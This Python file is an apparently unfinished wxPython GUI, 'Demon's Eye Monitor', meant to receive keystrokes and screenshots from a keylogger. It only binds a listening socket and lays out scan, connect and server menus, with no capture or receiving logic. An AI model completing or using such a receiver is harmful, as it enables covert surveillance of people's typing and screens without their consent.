#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#-----------------------------------------------------------------------------------------------------------
# Name:         demonseye-monitor.py
# Purpose:      Receive keylogger data (keystrokes and screenshots).
#
# Author:       Gabriel Marti
# email:        gabimarti at gmail dot com
# GitHub:       https://github.com/gabimarti
# Created:      27/07/2019
# Copyright:    (c) Gabriel Marti Fuentes 2019
# License:      GPL
#-----------------------------------------------------------------------------------------------------------
#

import socket
import threading
import wx
import wx.xrc

# Server to receive keylogger information
monitorSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
monitorPort = 5666
monitorSocket.bind(('',monitorPort))

# Client to connect search and connect to keylogger


class MainWindow(wx.Frame):
    def __init__(self, parent, title, size=(600,400) ):
        wx.Frame.__init__(self, parent, title=title, size=size)
        self.control = wx.TextCtrl(self, style=wx.TE_MULTILINE)
        self.CreateStatusBar()          # A Statusbar in the bottom of the window

        # Setting up the menu.
        filemenu= wx.Menu()

        # wx.ID_ABOUT and wx.ID_EXIT are standard IDs provided by wxWidgets.
        filemenu.Append(wx.ID_ABOUT, "&About"," Information about this program")
        filemenu.AppendSeparator()
        filemenu.Append(wx.ID_EXIT,"E&xit"," Terminate the program")

        # Creating the menubar.
        menuBar = wx.MenuBar()
        menuBar.Append(filemenu,"&File")        # Adding the "filemenu" to the MenuBar
        self.SetMenuBar(menuBar)                # Adding the MenuBar to the Frame content.
        self.Show(True)                         # Show the frame (the window)



###########################################################################
## Class MainFrame
###########################################################################

class MainFrame( wx.Frame ):

    def __init__( self, parent ):
        wx.Frame.__init__ ( self, parent, id = wx.ID_ANY, title = u"Demon's Eye Monitor", pos = wx.DefaultPosition, size = wx.Size( 813,570 ), style = wx.DEFAULT_FRAME_STYLE|wx.TAB_TRAVERSAL )

        self.SetSizeHints( wx.DefaultSize, wx.DefaultSize )

        bSizer2 = wx.BoxSizer( wx.VERTICAL )

        self.m_toolBar1 = wx.ToolBar( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TB_HORIZONTAL )
        self.m_button_scan = wx.Button( self.m_toolBar1, wx.ID_ANY, u"Scan for keylogger", wx.DefaultPosition, wx.DefaultSize, 0 )
        self.m_toolBar1.AddControl( self.m_button_scan )
        self.m_button_connect = wx.Button( self.m_toolBar1, wx.ID_ANY, u"Connect to keylogger", wx.DefaultPosition, wx.DefaultSize, 0 )
        self.m_toolBar1.AddControl( self.m_button_connect )
        self.m_gauge_scan = wx.Gauge( self.m_toolBar1, wx.ID_ANY, 100, wx.DefaultPosition, wx.DefaultSize, wx.GA_HORIZONTAL )
        self.m_gauge_scan.SetValue( 0 )
        self.m_toolBar1.AddControl( self.m_gauge_scan )
        self.m_toolBar1.Realize()

        bSizer2.Add( self.m_toolBar1, 0, wx.EXPAND, 5 )

        m_listKeyloggersChoices = []
        self.m_listKeyloggers = wx.ListBox( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, m_listKeyloggersChoices, 0 )
        bSizer2.Add( self.m_listKeyloggers, 0, wx.ALL, 5 )

        self.m_notebook_received = wx.Notebook( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, 0 )

        bSizer2.Add( self.m_notebook_received, 1, wx.EXPAND |wx.ALL, 5 )


        self.SetSizer( bSizer2 )
        self.Layout()
        self.m_menubar = wx.MenuBar( 0 )
        self.m_menu_program = wx.Menu()
        self.m_menuItem_exitprogram = wx.MenuItem( self.m_menu_program, wx.ID_ANY, u"Exit Program", wx.EmptyString, wx.ITEM_NORMAL )
        self.m_menu_program.Append( self.m_menuItem_exitprogram )

        self.m_menubar.Append( self.m_menu_program, u"Program" )

        self.m_menu_monitor = wx.Menu()
        self.m_menuItem_serverStart = wx.MenuItem( self.m_menu_monitor, wx.ID_ANY, u"Server Start", wx.EmptyString, wx.ITEM_NORMAL )
        self.m_menu_monitor.Append( self.m_menuItem_serverStart )

        self.m_menuItem_serverStop = wx.MenuItem( self.m_menu_monitor, wx.ID_ANY, u"Server Stop", wx.EmptyString, wx.ITEM_NORMAL )
        self.m_menu_monitor.Append( self.m_menuItem_serverStop )

        self.m_menubar.Append( self.m_menu_monitor, u"Monitor" )

        self.m_menu_help = wx.Menu()
        self.m_menuItem_about = wx.MenuItem( self.m_menu_help, wx.ID_ANY, u"About", wx.EmptyString, wx.ITEM_NORMAL )
        self.m_menu_help.Append( self.m_menuItem_about )

        self.m_menubar.Append( self.m_menu_help, u"Help" )

        self.SetMenuBar( self.m_menubar )

        self.m_statusBar1 = self.CreateStatusBar( 1, wx.STB_SIZEGRIP, wx.ID_ANY )

        self.Centre( wx.BOTH )

    def __del__( self ):
        pass


###########################################################################
## Class About
###########################################################################

class About( wx.Dialog ):
    def __init__( self, parent ):
        wx.Dialog.__init__ ( self, parent, id = wx.ID_ANY, title = u"About Demon's Eye Monitor", pos = wx.DefaultPosition, size = wx.Size( 604,368 ), style = wx.DEFAULT_DIALOG_STYLE )

        self.SetSizeHints( wx.DefaultSize, wx.DefaultSize )

        bSizerBox = wx.BoxSizer( wx.VERTICAL )

        bSizerBoxPanel = wx.BoxSizer( wx.VERTICAL )

        self.m_panel1 = wx.Panel( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
        bSizerBoxPanel.Add( self.m_panel1, 1, wx.EXPAND |wx.ALL, 5 )

        self.m_staticText1 = wx.StaticText( self, wx.ID_ANY, u"MyLabel", wx.DefaultPosition, wx.DefaultSize, 0 )
        self.m_staticText1.Wrap( -1 )

        bSizerBoxPanel.Add( self.m_staticText1, 0, wx.ALL, 5 )


        bSizerBox.Add( bSizerBoxPanel, 6, wx.EXPAND, 5 )

        bSizerBoxButton = wx.BoxSizer( wx.VERTICAL )

        self.m_buttonOK = wx.Button( self, wx.ID_ANY, u"OK", wx.Point( -1,-1 ), wx.DefaultSize, 0 )

        self.m_buttonOK.SetBitmapPosition( wx.RIGHT )
        bSizerBoxButton.Add( self.m_buttonOK, 0, wx.ALL, 5 )


        bSizerBox.Add( bSizerBoxButton, 1, wx.EXPAND, 5 )


        self.SetSizer( bSizerBox )
        self.Layout()

        self.Centre( wx.BOTH )

    def __del__( self ):
        pass






def main():
    app = wx.App(False)                                         # Create a new app, don't redirect stdout/stderr to a window.
    # frame = MainWindow(None, "Demon's Eye Monitor", (800,500))
    frame2 = MainFrame(None)                                    # Top-level window.
    frame2.Show(True);
    app.MainLoop()

if __name__ == '__main__':
    main()





